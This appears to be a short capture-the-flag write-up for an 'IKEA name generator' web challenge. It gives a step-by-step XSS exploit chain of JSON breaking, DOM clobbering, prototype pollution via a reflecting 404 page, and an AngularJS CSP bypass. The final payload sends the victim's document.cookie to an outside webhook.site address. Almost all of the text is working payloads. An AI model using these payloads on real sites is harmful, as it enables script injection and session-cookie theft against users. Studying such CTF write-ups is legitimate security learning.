What's your IKEA name? Mine is SORPOÄNGEN.

http://ikea-name-generator.chal.perfect.blue/

By: corb3nik

---

1.Break JSON Syntax by adding a new line (%0a) to make CONFIG undefined
`http://ikea-name-generator.chal.perfect.blue/?name=renwa%0a`

2.Using DOM Clobbering fake CONFIG 
`<form+id=CONFIG><a href=x name=url id=CONFIG>`

3.With `/404.php?msg=` to create a new JSON object 

`<form id=CONFIG><a href='http://ikea-name-generator.chal.perfect.blue/404.php?msg={"text":"renwa"}' id=CONFIG name=url></a>`

4.Prototype Pollution to add `innerHTML` to the sandbox iframe

`<form id=CONFIG><a href='http://ikea-name-generator.chal.perfect.blue/404.php?msg={"__proto__":{"innerHTML":"<h1>23</h1>"}}' id=CONFIG name=url></a>`

5.Using iframe srcdoc to include angularJS script to the iframe then using angular CSP bypass tricks to execute XSS

```
<form id=CONFIG>
<a href='http://ikea-name-generator.chal.perfect.blue/404.php?msg={"__proto__":{"innerHTML":"
<iframe srcdoc=&#x27;<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js></script>
<body ng-app ng-csp>
<input autofocus ng-focus=$event.path|orderBy:%26%23x27;[].constructor.from([23],console.log,top.location.href=%26%23x22;https://webhook.site/x?x=%26%23x22;%2bdocument.cookie)%26%23x27;>&#x27>
</iframe>"}}' id=CONFIG name=url>
</a>
</form>

```
